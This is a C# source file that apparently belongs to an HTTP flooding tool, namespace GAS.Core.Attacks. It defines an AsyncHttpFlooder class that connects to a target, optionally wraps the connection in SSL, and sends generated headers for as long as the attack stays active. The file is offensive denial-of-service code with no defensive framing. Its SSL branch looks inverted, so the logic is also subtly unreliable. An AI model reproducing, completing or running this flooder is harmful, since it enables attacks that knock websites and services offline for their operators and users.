using System.IO;
using System.Net.Sockets;
using System.Threading.Tasks;
using GAS.Core.AttackInformation;

namespace GAS.Core.Attacks {
    public class AsyncHttpFlooder : AsyncHttpFlooderCore {
        public IHttpAttackInfo HttpAttackInfo {
            get {
                return this.AttackInfo as IHttpAttackInfo;
            }
            set {
                this.AttackInfo = value;
            }
        }

        public AsyncHttpFlooder() {
            this.SendHeaders = this.SendHeadersI;
            this.WrapStream = this.WrapStreamI;
        }
        #region AsyncHttpFlooder
        /// <summary>
        /// Sends headers.
        /// Override to do magic with headers.
        /// Don't forget to append double \r\n to end
        /// </summary>
        /// <param name="stream">IO stream</param>
        /// <param name="basestream">Unwrapped IO stream</param>
        /// <param name="token">token from GetTcpClient</param>
        /// <returns>Was operation succeed</returns>
        protected virtual async Task<bool> SendHeadersI(
            Stream stream,
            NetworkStream basestream,
            object token ) {
            return await AsyncFlooderImplementations.SendData(
                stream,
                (a,b)=>AsyncFlooderImplementations.Generate(a,this.HttpAttackInfo.HeaderExpression),
                token,
                256,
                null,
                () => this.Active
            );
        }
        /// <summary>
        /// Prepares stream for transfer.
        /// Gets stream from raw stream after connection
        /// Override to use ssl/similar.
        /// </summary>
        /// <param name="getStream">input stream</param>
        /// <param name="token">token from GetTcpClient</param>
        /// <returns>stream which will be used to transfer data</returns>
        protected virtual async Task<Stream> WrapStreamI( NetworkStream getStream, object token ) {
            return this.HttpAttackInfo.Ssl.UseSsl
                ? getStream as Stream
                : await AsyncFlooderImplementations.GetSslStream(
                    getStream,
                    this.HttpAttackInfo.Ssl.Domain
                ) as Stream;
        }
        #endregion
    }
}
